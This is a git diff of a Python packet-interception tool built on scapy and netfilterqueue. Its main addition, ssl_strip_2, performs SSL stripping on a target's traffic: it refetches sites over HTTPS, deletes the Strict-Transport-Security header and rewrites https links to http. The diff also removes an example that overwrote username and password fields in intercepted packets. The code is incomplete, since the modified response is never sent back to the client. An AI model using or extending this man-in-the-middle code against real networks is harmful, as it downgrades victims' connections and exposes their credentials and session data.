@@ -1,6 +1,7 @@
 from scapy.all import Ether, TCP, IP, UDP, Raw, wrpcap, send 
 from networking import *
 from netfilterqueue import NetfilterQueue
+import requests
 import os
 
 class Packet_Handler:
@@ -44,7 +45,6 @@ def get_dprl(pkt):
 def ssl_strip(pkt, pkt_handler):
     gateway_ip = get_default_gateway_ip()
     gateway_mac = get_mac_address(gateway_ip)
-
     
     try:
         scapy_pkt = IP(pkt.get_payload())
@@ -86,7 +86,6 @@ def ssl_strip(pkt, pkt_handler):
             pkt_handler.add(scapy_pkt)
             pkt.accept()
             print("New_Load:", pkt.get_payload())
-
             
     except:
         pkt_handler.add(scapy_pkt)
@@ -94,9 +93,82 @@ def ssl_strip(pkt, pkt_handler):
         print("New_Load:", pkt.get_payload())
         #pass
 
-    #print("New_Load:", pkt.get_payload())
-    #pkt_handler.add(scapy_pkt)
-    #pkt.accept()
+def ssl_strip_2(pkt, target_ip, pkt_handler):
+    # Receive all of the packets from the client
+
+    # send own https request to the server
+    # The request IP should be from the AITM
+
+    # Receive the packets from the server
+
+    # Manipulate the server https response
+    # Strip strict-transfer-protocol
+    # Replace https links with http
+
+
+    def create_modified_response(response):
+        try:
+            # Create a new response object based on the original response content
+            new_response = requests.Response() # <Response [None]>
+            new_response.status_code = response.status_code # Status code! 200
+            new_response.url = response.url.replace("https://", "http://") # http://www.server.com/
+
+            
+            # Remove the Strict-Transport-Security
+            if 'Strict-Transport-Security' in response.headers:
+                popped = response.headers.pop('Strict-Transport-Security')
+                print(f"Popped 'Strict-Transport-Security: {popped}'")
+            else:
+                print("'Strict-Transport-Security not found.'")
+
+            # Replace https links with http in the response text
+            response_text = response.text.replace("https://", "http://")
+
+            new_response.headers = response.headers
+            # print("Headers!", new_response.headers)
+            new_response._content = response_text.encode('utf-8')
+            # print("_content?!", new_response._content)
+        except:
+            print("Failed to modify the response...")
+            pass
+
+        return new_response
+
+    try:
+        scapy_pkt = IP(pkt.get_payload())
+        decoded_payload = scapy_pkt[Raw].load.decode()
+
+        '''Capture user packets, send own to server, receive from server, modify response, send to user'''
+        if scapy_pkt.haslayer(TCP) and scapy_pkt.haslayer(Raw) and scapy_pkt[IP].src == target_ip:
+            # Extract the raw payload
+            print(f"Client Payload: {decoded_payload}")
+
+            # Get the host header url
+            host_url = None
+            payload_lines = decoded_payload.splitlines()
+
+            for line in payload_lines:
+                print(line)
+                if line.lower().startswith("host:"):
+                    host_url = line.split(":")[1].strip()
+                    break
+            print(host_url)
+
+            # Send HTTPS request to the server & modify it
+            response = requests.get("https://" + host_url)
+            print(f"Server Response: {response}")
+
+            print("3.\n")
+            new_response = create_modified_response(response)
+            print(f"Modified Response: {response}")
+
+            # Print manipulated response (or send it back to the client)
+            print("4.\n")
+            return new_response
+    except:
+        pkt.accept()
+        pkt_handler.add(scapy_pkt)
+
 
 # Input: Scapy packet capture
 # Description: Creates a packet_log.pcap file & a more detailed packet_log.txt file
@@ -117,17 +189,3 @@ def displayCapture(capture):
         print(f"\n--- Packet {i + 1}: " + packet.summary() + " ---\n")
         print(packet.show())
         print(f"\n--- Packet {i + 1}: End ---\n")
-
-# Scapy / Nfqueue example
-def packet_listener(packet):
-    scapy_packet = IP(packet.get_payload())
-    if scapy_packet.haslayer("UDP"):
-        if scapy_packet.haslayer("Raw") and scapy_packet[UDP].dport == 25:
-            if "user:" in scapy_packet[Raw].load.decode('latin-1').lower():
-                scapy_packet[Raw].load = b"USER:lolz"
-    
-    if "pass:" in scapy_packet[Raw].load.decode('latin-1').lower():
-        scapy_packet[Raw].load = b"pass:lolz"
-    
-    packet.set_payload(bytes(scapy_packet))
-    packet.accept()
